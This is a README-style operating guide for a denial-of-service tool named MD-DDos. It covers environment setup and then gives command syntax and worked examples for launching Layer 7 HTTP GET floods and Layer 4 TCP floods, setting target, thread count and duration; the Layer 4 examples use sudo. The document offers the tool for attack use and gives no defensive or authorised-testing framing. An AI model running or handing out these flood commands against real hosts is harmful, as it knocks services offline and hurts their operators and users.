# MD-DDos Running Process

This document outlines the steps to set up and run the MD-DDos tool.

## 1. Environment Setup

It is highly recommended to use a Python virtual environment to manage dependencies and avoid conflicts with system-wide packages.

### Create a Virtual Environment

Navigate to the project's root directory and run the following command to create a virtual environment named `venv`:

```bash
python3 -m venv venv
```

## 2. Installing Dependencies

Activate the virtual environment and install the required packages from `requirements.txt`.

### Activate the Virtual Environment

**On Linux/macOS:**

```bash
source venv/bin/activate
```

**On Windows:**

```bash
.\venv\Scripts\activate
```

### Install Packages

With the virtual environment activated, run the following command to install all necessary dependencies:

```bash
pip install -r requirements.txt
```

## 3. Running an Attack

Once the setup is complete, you can launch an attack using `start.py`. The script requires root privileges for Layer 4 attacks.

### Command-Line Arguments

The basic syntax for running an attack is:

```bash
python3 start.py <METHOD> <TARGET> <THREADS> <DURATION>
```

-   `<METHOD>`: The attack method to use (e.g., `TCP`, `GET`).
-   `<TARGET>`: The target's IP address and port (for Layer 4) or URL (for Layer 7).
-   `<THREADS>`: The number of concurrent threads to use.
-   `<DURATION>`: The duration of the attack in seconds.

### Examples

#### Layer 7 Attack (HTTP GET Flood)

This command launches a `GET` flood against `http://example.com` using 100 threads for 60 seconds.

```bash
python3 start.py GET http://example.com 100 60
```

#### Layer 4 Attack (TCP Flood)

This command launches a `TCP` flood against `192.168.1.1` on port `80` using 50 threads for 120 seconds. Note that Layer 4 attacks require `sudo`.

```bash
sudo python3 start.py TCP 192.168.1.1:80 50 120
```

### Listing Available Methods

To see a list of all available attack methods and tools, run:

```bash
python3 start.py --help
```

This will display the usage information, including all supported Layer 4 and Layer 7 methods.
